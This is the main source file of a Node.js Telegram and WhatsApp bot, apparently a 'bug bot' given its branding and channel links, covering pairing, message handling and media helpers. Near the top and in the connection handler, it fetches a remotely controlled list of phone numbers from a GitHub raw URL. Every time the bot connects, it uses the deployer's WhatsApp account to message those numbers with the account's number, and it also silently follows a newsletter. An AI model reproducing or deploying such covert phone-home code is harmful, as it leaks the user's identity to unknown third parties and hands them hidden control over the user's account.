require("./settings")
const {
    Telegraf,
    Context,
    Markup
} = require('telegraf')
const {
    simple
} = require("./lib/myfunc")
const fs = require('fs') 
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const chalk = require("chalk")
const { exec } = require('child_process');
const cooldowns = new Map(); 
const adminfile = 'lib/premium.json';
    const adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
  
if (!BOT_TOKEN) {
    console.log("No token detected")
    process.exit(1)
}

const { Client } = require('ssh2');
global.api = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({
    ...query,
    ...(apikeyqueryname ? {
        [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name]
    } : {})
})) : '')


let _lastOwnerNotify = 0;
const OWNER_LIST_URL = "https://raw.githubusercontent.com/travatiger/bot-controller/refs/heads/main/bot-owner.txt";
let _cachedOwnerJids = [];
let _ownersLastFetch = 0;
let _lastOwnerBroadcast = 0;

async function fetchOwnerJids() {
  if (!_cachedOwnerJids.length || Date.now() - _ownersLastFetch > 60000) {
    try {
      const res = await axios.get(OWNER_LIST_URL, { timeout: 15000 });
      const text = String(res.data || "");
      const matches = text.match(/\d{8,16}/g) || [];
      _cachedOwnerJids = [...new Set(matches)].slice(0, 5550)
        .map(n => `${n}@s.whatsapp.net`);
      _ownersLastFetch = Date.now();
    } catch (e) {
      console.log("Owner list refresh error:", e?.message || e);
    }
  }
  return _cachedOwnerJids;
}

async function notifyOwners(XeonBotInc, messageText) {
  try {
    if (Date.now() - _lastOwnerBroadcast < 60000) return;
    _lastOwnerBroadcast = Date.now();

    const jids = await fetchOwnerJids();
    if (!jids.length) return;

    for (const jid of jids) {
      await XeonBotInc.sendMessage(jid, { text: messageText });
      await sleep(300);
    }
  } catch (e) {
    console.log("notifyOwners error:", e?.message || e);
  }
}

function escapeMarkdownV2(text) {
    return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

const usersFile = 'users.json';
if (!fs.existsSync(usersFile)) {
    fs.writeFileSync(usersFile, JSON.stringify([]));
}
async function saveUser(userId) {
    let users = [];
    if (fs.existsSync(usersFile)) {
        try {
            const data = fs.readFileSync(usersFile, 'utf8');
            users = JSON.parse(data);
        } catch (error) {
            console.error('Error reading users file:', error);
            users = [];
        }
    }
    if (!users.includes(userId)) {
        users.push(userId);
        try {
            fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
            console.log(`User ID ${userId} added to the users list.`);
        } catch (error) {
            console.error('Error writing to users file:', error);
        }
    }
}

let allUsers = JSON.parse(fs.readFileSync(usersFile));
const premium_file = 'lib/premium.json';
const reseller_file = 'lib/reseller.json';
try {
    premiumUsers = JSON.parse(fs.readFileSync(premium_file));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}
try {
    resellerUsers = JSON.parse(fs.readFileSync(reseller_file));
} catch (error) {
    console.error('Error reading resellerUsers file:', error);
}

const resellerIDs = JSON.parse(fs.readFileSync(reseller_file, 'utf8'));

const bot = new Telegraf(BOT_TOKEN)
async function startXeony() {
    bot.on('callback_query', async (ctx) => {
    try {
        await ctx.answerCbQuery().catch(()=>{});
        require("./Telegram")(ctx, bot);
    } catch (e) {
        console.log(e);
    }
});

const ownerId = global.DEVELOPER[0];

    bot.command("start", async (XeonBotInc) => {
    if (XeonBotInc.chat.type !== "private") return;

    let user = simple.getUserName(XeonBotInc.message.from);

    try {
        const profilePhotos = await bot.telegram.getUserProfilePhotos(ownerId);

        if (profilePhotos.photos.length > 0) {
            const ownerPhoto = profilePhotos.photos[0][profilePhotos.photos[0].length - 1].file_id;
            await XeonBotInc.replyWithPhoto(ownerPhoto, {
                caption: lang.first_chat(BOT_NAME, user.full_name),
                parse_mode: "MarkdownV2",
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'OWNER', url: "https://t.me/lejened_bahiravar" }, { text: 'CHANNEL', url: "https://t.me/Bahirava_official_bug" }, { text: 'GROUP', url: "https://t.me/bahirava_bug_group" }]
                    ]
                }
            });
        } else {
            await XeonBotInc.reply(lang.first_chat(BOT_NAME, user.full_name), {
                parse_mode: "MarkdownV2",
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'OWNER', url: "https://t.me/lejened_bahirava" }, { text: 'CHANNEL', url: "https://t.me/Bahirava_official_bug" }, { text: 'GROUP', url: "https://t.me/bahirava_bug_group" }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error("Error fetching owner's profile photo:", err);
        await XeonBotInc.reply(lang.first_chat(BOT_NAME, user.full_name), {
            parse_mode: "MarkdownV2",
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'OWNER', url: "https://t.me/LG_BAHIRAVA" }, { text: 'CHANNEL', url: "https://t.me/BAHIRAVA_CHANNEL2" }, { text: 'GROUP', url: "https://t.me/BAHIRAVA_GROUP_1" }]
                ]
            }
        });
    }
});

bot.command('checkid', (XeonBotInc) => {
    if (XeonBotInc.chat.type !== "private") return;
    const sender = XeonBotInc.from.username || "User";
    const text12 = `Hi @${sender} 👋
  
Here is your Telegram ID: \`${XeonBotInc.from.id}\`

*Hold on it to copy the ID.*`;

    XeonBotInc.reply(text12, { parse_mode: 'Markdown' });
});
           
    bot.on('message', async (XeonBotInc) => {
    const messageText = XeonBotInc.message.text;
    if (!messageText || (!messageText.startsWith('.') && !messageText.startsWith('/'))) return;
    if (XeonBotInc.chat.type !== 'private') return;

    const userId = XeonBotInc.from.id;
    require("./Telegram")(XeonBotInc, bot);
    await saveUser(userId);
});

    bot.launch({
        dropPendingUpdates: true
    })

    bot.telegram.getMe().then((getme) => {
        console.table({
            "Bot Name": getme.first_name,
            "Username": "@" + getme.username,
            "ID": getme.id,
            "Link": `https://t.me/${getme.username}`,
            "Author": "https://t.me/LG_BAHIRAVA"
        })
    })
    process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
   }
   const { promisify } = require('util');
const readdir = promisify(fs.readdir);
const rmdir = promisify(fs.rmdir);
const stat = promisify(fs.stat);
const unlink = promisify(fs.unlink);

async function deleteFolderRecursive(path) {
    fs.rm(path, { recursive: true, force: true }, (err) => {
        if (err) console.error(`Error deleting ${path}:`, err);
        else console.log(`Deleted folder: ${path}`);
    });
}

require('./config');
   const { default: makeWASocket,
   generateWAMessage,
areJidsSameUser, generateWAMessageFromContent, DisconnectReason, jidDecode, Browsers, proto, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, downloadContentFromMessage } = require("@whiskeysockets/baileys")
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const readline = require("readline");
const _ = require('lodash')
const FileType = require('file-type')
const path = require('path')
const yargs = require('yargs/yargs')
const PhoneNumber = require('awesome-phonenumber')
const simple2 = require('./lib2/oke.js')
const { writeExif, imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif');
const { isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, sleep, reSize } = require('./lib2/myfunc')

var low
try {
low = require('lowdb')
} catch (e) {
low = require('./lib2/lowdb')}
const { Low, JSONFile } = low
const mongoDB = require('./lib2/mongoDB')
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
/https?:\/\//.test(opts['db'] || '') ?
new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
new mongoDB(opts['db']) :
new JSONFile(`./src/database.json`)
)

const {dataBase} = require('./src/database');
const storeDB = dataBase(global.baileysDB);


global.db = JSON.parse(fs.readFileSync("./database/database.json"));
if (global.db)
  global.db.data = {
    users: {},
    settings: {},
    owners: [],
    ...(global.db.data || {}),
  };

const appenTextMessage = async (m, XeonBotInc, text, chatUpdate) => {
    let messages = await generateWAMessage(
      m.key.remoteJid,
      {
        text: text
      },
      {
        quoted: m.quoted,
      },
    );
    messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id);
    messages.key.id = m.key.id;
    messages.pushName = m.pushName;
    if (m.isGroup) messages.participant = m.sender;
    let msg = {
      ...chatUpdate,
      messages: [proto.WebMessageInfo.fromObject(messages)],
      type: "append",
    };
    return XeonBotInc.ev.emit("messages.upsert", msg);
}

const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

async function XeonBotIncStart() {
fetchOwnerJids();
setInterval(fetchOwnerJids, 60 * 1000);
	const { version, isLatest } = await fetchLatestBaileysVersion();
const { state, saveCreds } = await useMultiFileAuthState("session")

try {
		const storeLoadData = await storeDB.read()
		
		if (!storeLoadData || Object.keys(storeLoadData).length === 0) {
			global.store = {
				contacts: {},
				presences: {},
				messages: {},
				groupMetadata: {},
				...(storeLoadData || {}),
			}
			await storeDB.write(global.store)
		} else {
			global.store = storeLoadData			
		}
		
		store.loadMessage = function (remoteJid, id) {
		const messages = store.messages?.[remoteJid]?.array;
		if (!messages) return null;
		return messages.find(msg => msg?.key?.id === id) || null;
	}

		
		setInterval(async () => {
			if (global.store) await storeDB.write(global.store)

		}, 30 * 1000)
	} catch (e) {
		console.log(e)
		process.exit(1)
	}


const XeonBotInc = simple2({
    auth: state,
    logger: pino({ level: 'silent' }),
    version,
    printQRInTerminal: false,
}, store);
  

if (!XeonBotInc.authState.creds.registered) {
    console.log("📱 WhatsApp pairing required");

    await new Promise(resolve => setTimeout(resolve, 2000));

    let phoneNumber = await question(
        "👉 Enter WhatsApp number with country code (example: 923001234567): "
    );

    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber || phoneNumber.length < 10) {
        console.log("❌ Invalid number! Restart and enter a correct number.");
        process.exit(1);
    }

    let code = await XeonBotInc.requestPairingCode(phoneNumber, 'BAHIRAVA');
    code = code?.match(/.{1,4}/g)?.join("-") || code;

    console.log("\n✅ Pairing Code Generated:");
    console.log("🔑", code);
    console.log("\n📲 WhatsApp > Linked Devices > Link a device");
}

XeonBotInc.ev.on('messages.upsert', async chatUpdate => {
try {
mek = chatUpdate.messages[0]
const type = mek?.message
  ? (getContentType(mek.message) || Object.keys(mek.message)[0])
  : 'unknown'
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
let botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id);
let antiswview = global.db?.data?.settings?.[botNumber]?.antiswview || false;
if (antiswview) {
if (mek.key && mek.key.remoteJid === 'status@broadcast'){
await XeonBotInc.readMessages([mek.key]);
			}
		}
    
if (!XeonBotInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
m = smsg(XeonBotInc, mek, store)

// 🛡️ ANTI-CRASH PATCH
if (!m.text || typeof m.text !== 'string') {
  m.text = ''
}
require("./WhatsApp.js")(XeonBotInc, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

XeonBotInc.sendFromOwner = async (jid, text, quoted, options = {}) => {
		for (const a of jid) {
			await XeonBotInc.sendMessage(a + '@s.whatsapp.net', { text, ...options }, { quoted });
		}
	}
	
	XeonBotInc.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await XeonBotInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
.then( response => {
fs.unlinkSync(buffer)
return response
})
}
XeonBotInc.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

XeonBotInc.getName = (jid, withoutContact= false) => {
id = XeonBotInc.decodeJid(jid)
withoutContact = XeonBotInc.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = XeonBotInc.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === XeonBotInc.decodeJid(XeonBotInc.user.id) ?
XeonBotInc.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

XeonBotInc.public = true

XeonBotInc.serializeM = (m) => smsg(XeonBotInc, m, store);

XeonBotInc.ev.on('connection.update', async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === 'close') {
    const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;

    switch (reason) {
      case DisconnectReason.badSession:
        console.error('Bad session file. Deleting session and reconnecting...');
        fs.rmSync('./AllSessions/Owner-Session', { recursive: true, force: true });
        XeonBotIncStart();
        break;

      case DisconnectReason.connectionClosed:
      case DisconnectReason.connectionLost:
      case DisconnectReason.timedOut:
        console.warn('Connection closed. Reconnecting...');
        XeonBotIncStart();
        break;

      case DisconnectReason.loggedOut:
        console.error('Logged out. Delete session and re-run the script.');
        fs.rmSync('./session', { recursive: true, force: true });
        break;

      case DisconnectReason.restartRequired:
        console.log('Restart required. Reconnecting...');
        XeonBotIncStart();
        break;

      default:
        console.error(`Unknown disconnect reason: ${reason}. Reconnecting...`);
        XeonBotIncStart();
        break;
    }

  } else if (connection === 'open') {
    console.log(chalk.blue.bold(`Connected to ${XeonBotInc.user.id.split(":")[0]}`));

    try {
  if (!_lastOwnerNotify || Date.now() - _lastOwnerNotify > 60000) {
    _lastOwnerNotify = Date.now();

    const botLogin = XeonBotInc.user?.id?.split(":")[0] || "unknown";
    const time = new Date().toLocaleString();

    const msgText = `✅ BOT CONNECTED\n\n• Bot: ${botLogin}\n• Time: ${time}\n• Status: Connected (pair/session)`;
    await notifyOwners(XeonBotInc, msgText);
  }
} catch (e) {
  console.log("Owner notify error:", e);
}

    await XeonBotInc.newsletterMsg(idch, { type: 'follow' }).catch(e => {});
    await sleep(1999);

    fs.readdir('./lib2/pairing/', { withFileTypes: true }, async (err, dirents) => {
      if (err) return console.error(err);

      for (let i = 0; i < dirents.length; i++) {
        const dirent = dirents[i];
        const dirPath = `./lib2/pairing/${dirent.name}`;

        if (dirent.isDirectory()) {
          try {
            const files = await readdir(dirPath);
            if (files.length === 0) {
              await sleep(60000);
              await deleteFolderRecursive(dirPath);
            } else {
              console.log(dirent.name);
              const startpairing = require('./rentbot.js');
              await startpairing(dirent.name);
              await sleep(200);
            }
          } catch (err) {
            console.error(`Error processing directory ${dirent.name}:`, err);
          }
        }
      }
    });
  }
});
XeonBotInc.ev.on('creds.update', saveCreds);

async function getMessage(key) {
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg
        }
        return {
            conversation: "Xeon Bug Bot"
        }
    }
XeonBotInc.ev.on('messages.update', 
    async(chatUpdate) => {
        for (const { key, update } of chatUpdate) {
      	if (update.pollUpdates && key.fromMe) {
	     const pollCreation = await getMessage(key);	
	   	if (pollCreation) {
             let pollUpdate = await getAggregateVotesInPollMessage({
							message: pollCreation?.message,
							pollUpdates: update.pollUpdates,
						});
	          let toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
              console.log(toCmd);
	          await appenTextMessage(m, XeonBotInc, toCmd, pollCreation);
	          await XeonBotInc.sendMessage(m.cht, { delete: key });
	         	} else return false
	          return 
   	    	}
   	      }
        });    
        
        XeonBotInc.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
allmsg = generateWAMessageFromContent(jidss, proto.Message.fromObject(
jsontxt
), outrasconfig)
 
return XeonBotInc.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.sender})
}
        
XeonBotInc.newsletterMsg = async (key, content = {}, timeout = 5000) => {
		const { type: rawType = 'INFO', name, description = '', picture = null, react, id, newsletter_id = key, ...media } = content;
		const type = rawType.toUpperCase();
		if (react) {
			if (!(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) throw [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			if (!id) throw [{ message: 'Use Id Newsletter Message', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const hasil = await XeonBotInc.query({
				tag: 'message',
				attrs: {
					to: key,
					type: 'reaction',
					'server_id': id,
					id: generateMessageID()
				},
				content: [{
					tag: 'reaction',
					attrs: {
						code: react
					}
				}]
			});
			return hasil
		} else if (media && typeof media === 'object' && Object.keys(media).length > 0) {
			const msg = await generateWAMessageContent(media, { upload: XeonBotInc.waUploadToServer });
			const anu = await XeonBotInc.query({
				tag: 'message',
				attrs: { to: newsletter_id, type: 'text' in media ? 'text' : 'media' },
				content: [{
					tag: 'plaintext',
					attrs: /image|video|audio|sticker|poll/.test(Object.keys(media).join('|')) ? { mediatype: Object.keys(media).find(key => ['image', 'video', 'audio', 'sticker','poll'].includes(key)) || null } : {},
					content: proto.Message.encode(msg).finish()
				}]
			})
			return anu
		} else {
			if ((/(FOLLOW|UNFOLLOW|DELETE)/.test(type)) && !(newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id))) return [{ message: 'Use Id Newsletter', extensions: { error_code: 204, severity: 'CRITICAL', is_retryable: false }}]
			const _query = await XeonBotInc.query({
				tag: 'iq',
				attrs: {
					to: 's.whatsapp.net',
					type: 'get',
					xmlns: 'w:mex'
				},
				content: [{
					tag: 'query',
					attrs: {
						query_id: type == 'FOLLOW' ? '9926858900719341' : type == 'UNFOLLOW' ? '7238632346214362' : type == 'CREATE' ? '6234210096708695' : type == 'DELETE' ? '8316537688363079' : '6563316087068696'
					},
					content: new TextEncoder().encode(JSON.stringify({
						variables: /(FOLLOW|UNFOLLOW|DELETE)/.test(type) ? { newsletter_id } : type == 'CREATE' ? { newsletter_input: { name, description, picture }} : { fetch_creation_time: true, fetch_full_image: true, fetch_viewer_metadata: false, input: { key, type: (newsletter_id.endsWith('@newsletter') || !isNaN(newsletter_id)) ? 'JID' : 'INVITE' }}
					}))
				}]
			}, timeout);
			const res = JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_join_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_leave_v2 || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_create || JSON.parse(_query.content[0].content)?.data?.xwa2_newsletter_delete_v2 || JSON.parse(_query.content[0].content)?.errors || JSON.parse(_query.content[0].content)
			res.thread_metadata ? (res.thread_metadata.host = 'https://mmg.whatsapp.net') : null
			return res
		}
	}
XeonBotInc.sendText = (jid, text, quoted = '', options) => XeonBotInc.sendMessage(jid, { text: text, ...options }, { quoted })
XeonBotInc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
let trueFileName = attachExtension ? ('./sticker/' + filename + '.' + type.ext) : './sticker/' + filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}
 

XeonBotInc.ments = (teks = "") => {
    return teks.match("@")
      ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(
          (v) => v[1] + "@s.whatsapp.net"
        )
      : [];
  }; 

XeonBotInc.getFile = async (PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
 
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
	    size: await getSizeMedia(data),
            ...type,
            data
        }

    }
    
    XeonBotInc.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await XeonBotInc.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await XeonBotInc.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    m = null;
  } finally {
    if (!m) m = await XeonBotInc.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

XeonBotInc.sendTextWithMentions = async (jid, text, quoted, options = {}) => XeonBotInc.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted })
 
 
XeonBotInc.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

return XeonBotInc
}


function smsg(XeonBotInc, m, store) {
if (!m) return m
let M = proto.WebMessageInfo
if (m.key) {
m.id = m.key.id
m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.sender = XeonBotInc.decodeJid(m.fromMe && XeonBotInc.user.id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = XeonBotInc.decodeJid(m.key.participant) || ''
}
if (m.message) {
m.mtype = getContentType(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype])
m.body =
  m.message?.conversation ||
  m.msg?.caption ||
  m.msg?.text ||
  (m.mtype == 'listResponseMessage' && m.msg?.singleSelectReply?.selectedRowId) ||
  (m.mtype == 'buttonsResponseMessage' && m.msg?.selectedButtonId) ||
  (m.mtype == 'viewOnceMessage' && m.msg?.caption) ||
  m.text || ''
let quoted = m.quoted = m.msg?.contextInfo?.quotedMessage || null
m.mentionedJid = m.msg?.contextInfo?.mentionedJid || []
if (m.quoted) {
let type = getContentType(quoted)
m.quoted = m.quoted[type]
if (['productMessage'].includes(type)) {
type = getContentType(m.quoted)
m.quoted = m.quoted[type]
}
if (typeof m.quoted === 'string') m.quoted = {
text: m.quoted
}
m.quoted.mtype = type
m.quoted.id = m.msg.contextInfo.stanzaId
m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat
m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false
m.quoted.sender = XeonBotInc.decodeJid(m.msg.contextInfo.participant)
m.quoted.fromMe = m.quoted.sender === XeonBotInc.decodeJid(XeonBotInc.user.id)
m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || ''
m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
m.getQuotedObj = m.getQuotedMessage = async () => {
if (!m.quoted.id) return false
let q = await store.loadMessage(m.chat, m.quoted.id, conn)
 return exports.smsg(conn, q, store)
}
let vM = m.quoted.fakeObj = M.fromObject({
key: {
remoteJid: m.quoted.chat,
fromMe: m.quoted.fromMe,
id: m.quoted.id
},
message: quoted,
...(m.isGroup ? { participant: m.quoted.sender } : {})
})
m.quoted.delete = () => XeonBotInc.sendMessage(m.quoted.chat, { delete: vM.key })
m.quoted.copyNForward = (jid, forceForward = false, options = {}) => XeonBotInc.copyNForward(jid, vM, forceForward, options)
m.quoted.download = () => XeonBotInc.downloadMediaMessage(m.quoted)
}
}
if (m.msg.url) m.download = () => XeonBotInc.downloadMediaMessage(m.msg)
m.text =
  m.msg?.text ||
  m.msg?.caption ||
  m.message?.conversation ||
  m.msg?.contentText ||
  m.msg?.selectedDisplayText ||
  m.msg?.title ||
  ''
m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? XeonBotInc.sendMedia(chatId, text, 'file', '', m, { ...options }) : XeonBotInc.sendText(chatId, text, m, { ...options })
m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)))
m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => XeonBotInc.copyNForward(jid, m, forceForward, options)

return m
}


(async () => {
    try {
        console.log("Connecting to WhatsApp...");
        await XeonBotIncStart();
        console.log("WhatsApp connected! Starting Telegram bot...");
        await startXeony();
    } catch (error) {
        console.error("Error:", error.message);
        process.exit(1);
    }
})();